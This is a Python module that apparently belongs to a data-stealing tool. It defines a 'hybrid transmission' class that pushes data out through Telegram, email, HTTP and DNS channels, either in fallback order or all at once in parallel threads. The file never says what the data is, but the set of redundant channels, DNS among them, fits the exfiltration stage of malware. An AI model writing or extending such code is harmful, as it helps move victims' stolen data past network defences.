"""
Hybrid Transmission Module
Combines multiple transmission methods with fallback
"""

import threading
import time
import logging
from .base import BaseTransmission
from .email import EmailTransmission
from .telegram import TelegramTransmission
from .http import HTTPTransmission
from .dns import DNSTransmission
from config import Config

class HybridTransmission(BaseTransmission):
    def __init__(self):
        super().__init__()
        
        # Initialize all transmission methods
        self.methods = {
            'telegram': TelegramTransmission(),
            'email': EmailTransmission(),
            'http': HTTPTransmission(),
            'dns': DNSTransmission()
        }
        
        self.fallback_order = Config.TRANSMISSION_CONFIG['fallback_methods']
        self.method_name = "Hybrid"
    
    def send(self, data):
        """Send data using multiple methods with fallback"""
        success_count = 0
        
        # Try each method in order
        for method_name in self.fallback_order:
            method = self.methods.get(method_name)
            if not method:
                continue
            
            logging.info(f"[*] Trying {method_name}...")
            
            if method.send(data):
                success_count += 1
                logging.info(f"[✓] {method_name} successful")
                
                # If one method works, we can stop for efficiency
                # But for reliability, we might want to try all
                if Config.TRANSMISSION_CONFIG.get('parallel_transmit', False):
                    continue
                else:
                    return True
        
        # If parallel transmission is enabled, try all methods simultaneously
        if Config.TRANSMISSION_CONFIG.get('parallel_transmit', False):
            results = self._parallel_send(data)
            success_count = sum(results)
        
        if success_count > 0:
            self.log_attempt(True, len(data))
            return True
        else:
            self.log_attempt(False, 0)
            return False
    
    def _parallel_send(self, data):
        """Send using all methods simultaneously"""
        results = []
        threads = []
        
        # Create threads for each method
        for method in self.methods.values():
            thread = threading.Thread(
                target=self._send_with_method,
                args=(method, data, results)
            )
            threads.append(thread)
            thread.start()
        
        # Wait for all to complete
        for thread in threads:
            thread.join()
        
        return results
    
    def _send_with_method(self, method, data, results):
        """Send using a specific method (for threading)"""
        try:
            result = method.send(data)
            results.append(result)
        except:
            results.append(False)